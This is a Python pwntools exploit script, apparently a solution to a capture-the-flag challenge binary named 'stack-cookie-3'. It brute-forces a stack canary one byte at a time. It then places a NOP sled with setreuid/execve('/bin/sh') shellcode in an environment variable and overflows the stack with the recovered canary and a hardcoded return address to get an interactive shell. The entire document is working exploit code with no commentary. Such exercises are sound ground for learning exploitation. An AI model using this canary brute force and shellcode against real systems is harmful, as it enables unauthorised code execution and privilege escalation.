#!/usr/bin/env python

from pwn import *

def find (cookie):
    itr = 0
    val = 0
    while True:
        print(str(itr) + ": " + str(hex(val)))

        buf = "A" * 0x80 + cookie + chr(val)

        p.recv(timeout=0.1)
        p.sendline(str(len(buf)))

        p.recvline(timeout=0.1)
        p.send(buf)

        sleep(0.1)
        check = p.recv(timeout=0.1)

        if "*** stack smashing detected ***" not in check:
            print("Found the right one!\nValue: " + hex(val))
            return val;

        val += 1
        itr += 1

shellcode = '\x90' * 10000 + "j2X\xcd\x80PP[YjGX\xcd\x801\xc9\x89\xd2j\x0bXQhn/shh//bi\x89\xe3\xcd\x80"

env = {
        'shellcode': shellcode
}

context.terminal = ['tmux', 'splitw', '-h']
p = process("./stack-cookie-3", env=env)
#gdb.attach(p)


address = p32(0xffffdd08)

#buf = shellcode + "A" * (0x88 - len(shellcode)) + cookie + address

cookie = chr(0)

for i in range(3):
    val = find(cookie)
    cookie += chr(val)

print("cookie: " + cookie)

buf = "A" * 0x80 + cookie + "A" * 0xc + address

print(p.recv(timeout=0.1))
p.sendline(str(len(buf)))
print(p.recvline(timeout=0.1))

p.send(buf)
sleep(0.1)
print(p.recv(timeout=0.1))


p.interactive()
